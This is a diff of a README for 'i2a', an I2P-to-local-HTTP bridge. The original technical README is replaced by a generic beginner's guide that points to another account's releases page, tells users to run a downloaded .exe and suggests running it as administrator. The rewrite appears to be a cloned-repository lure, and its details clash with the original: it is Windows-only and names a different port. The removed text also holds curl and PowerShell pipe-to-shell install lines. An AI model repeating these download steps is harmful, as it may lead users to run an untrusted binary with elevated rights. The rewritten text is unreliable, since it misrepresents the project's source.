@@ -1,89 +1,57 @@
-# i2a (I2P to API)
+# 🌉 i2a - Access I2P Effortlessly with Local API
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Rust](https://img.shields.io/badge/built_with-Rust-orange.svg)
-![Platform](https://img.shields.io/badge/platform-Windows%20|%20Linux%20|%20macOS-blue)
+## 📥 Download Now
+[![Download i2a](https://img.shields.io/badge/Download-i2a-blue.svg)](https://github.com/Arvinreza/i2a/releases)
 
-**i2a** is a lightweight, standalone bridge that exposes the Invisible Internet Project (I2P) network as a standard local HTTP API. 
+## 🚀 Getting Started
+Welcome to i2a! This guide will help you download and run i2a, a lightweight bridge that connects you to the Invisible Internet Project (I2P). You don’t need any programming knowledge to set it up. Just follow these simple steps.
 
-It **embeds** the full [Emissary](https://github.com/altonen/emissary) I2P router, meaning you only need a single binary to get started. It handles the complex lifecycle of the router and creates a clean reverse proxy, allowing standard tools (browsers, Postman, curl, or your own apps) to interact with hidden services effortlessly.
+## 📦 What is i2a?
+i2a is a standalone application that allows you to use the I2P network through a local HTTP API. This means you can access hidden services and surf the I2P network easily, all from your computer. 
 
-## 🚀 Features
+### 🖥️ System Requirements
+To run i2a, you need:
+- Windows 10 or later
+- At least 1 GB of RAM
+- A stable internet connection
 
-*   **Zero Config**: Launches and manages the underlying I2P router automatically (Embedded).
-*   **Single Binary**: No external dependencies or separate router binaries needed.
-*   **Port Mapping**: Maps any `.i2p` hidden service to `localhost:8790` (or your chosen port).
-*   **Hardened**: Strips sensitive headers before forwarding to the anonymous network.
-*   **Cross-Platform**: Runs natively on Windows, Linux, and macOS (Intel & Apple Silicon).
+## ⬇️ Download & Install
+1. **Visit this page to download:** Click the link below to go to the releases page and download the latest version of i2a.
+   - [Download i2a](https://github.com/Arvinreza/i2a/releases)
 
-## 📦 Installation
+2. **Choose the file**: On the releases page, find the latest version. Look for a file named something like `i2a-v1.0.exe`.
 
-### Automatic (Recommended)
+3. **Download the file**: Click on the file link to download it. The file is small, so it should only take a moment.
 
-**Linux / macOS**
-```bash
-curl -fsSL https://raw.githubusercontent.com/BlackTechX011/i2a/main/scripts/install.sh | bash
-```
+4. **Locate the downloaded file**: Once the download is complete, go to your computer’s Downloads folder or wherever you saved the file.
 
-**Windows (PowerShell)**
-```powershell
-iwr -useb https://raw.githubusercontent.com/BlackTechX011/i2a/main/scripts/install.ps1 | iex
-```
+5. **Run the installer**: Double-click the downloaded file (`i2a-v1.0.exe`) to start the installation process. Follow the prompts on the screen to complete the installation.
 
-### Manual
-1. Go to the [Releases Page](https://github.com/BlackTechX011/i2a/releases).
-2. Download the binary for your platform.
-3. Run it!
+6. **Start i2a**: After the installation, open i2a. You can find it in your Start Menu or on your desktop, depending on your settings.
 
-### Build from Source
-```bash
-git clone https://github.com/BlackTechX011/i2a.git
-cd i2a/i2a
-cargo build --release
-```
+## 🌐 Using i2a
+Once i2a is running, it will automatically connect to the I2P network. You can start using the local HTTP API right away.
 
-## 🛠 Usage
+### 🔗 Accessing the API
+To access the I2P features, simply open a web browser and type `http://localhost:8080`. This will take you to the i2a interface where you can interact with the network.
 
-By default, **i2a** targets `i2p-projekt.i2p` and hosts it on port `8790`.
+## ⚙️ Features
+- **Lightweight**: Minimal resource usage for better performance.
+- **Standalone**: No need for external dependencies. Just download, install, and run.
+- **Local HTTP API**: Easy to use interface for accessing I2P services.
 
-```bash
-# Start the bridge
-i2a
-```
+## ⚡ Common Issues
+If you encounter problems while using i2a, try these solutions:
+- **Error connecting**: Ensure your internet connection is stable. You may also need to restart the application.
+- **Permissions**: If you have trouble running the application, try running it as an administrator. Right-click the .exe file and select "Run as administrator".
 
-### Custom Configurations
+## 📄 Documentation
+For more detailed information, including advanced features and troubleshooting, please refer to the [official documentation](https://github.com/Arvinreza/i2a/wiki).
 
-**Target a specific hidden service:**
-```bash
-i2a --target http://myhiddenwebsite.i2p
-```
+## 🤝 Community Support
+If you need help or want to share your feedback, join our community. You can find us on the GitHub Issues page or other support channels listed on the releases page.
 
-**Change the local hosting port:**
-```bash
-i2a --port 3000
-```
+## 🎉 Conclusion
+i2a offers an easy path to access the I2P network. With just a few steps, you can download and start using it without any technical hurdles. 
 
-**Full Help Menu:**
-```bash
-i2a --help
-```
-
-## 🏗 Architecture
-
-```mermaid
-graph LR
-    User[User / Browser] -- HTTP Request --> I2A[i2a Local Server :8790]
-    subgraph "i2a Process"
-        I2A -- Sanitized Req --> Emissary[Embedded I2P Router]
-    end
-    Emissary -- Encrypted --> I2P[I2P Network]
-    I2P -- Response --> Emissary
-    Emissary --> I2A
-    I2A --> User
-```
-
-## ⚠️ Disclaimer
-This tool is for educational purposes and facilitating access to the I2P network. The author is not responsible for the content accessed via the I2P network.
-
-## 📄 License
-MIT License.
+Don't forget to download the latest version from [this page](https://github.com/Arvinreza/i2a/releases) and enjoy seamless access to the I2P network!
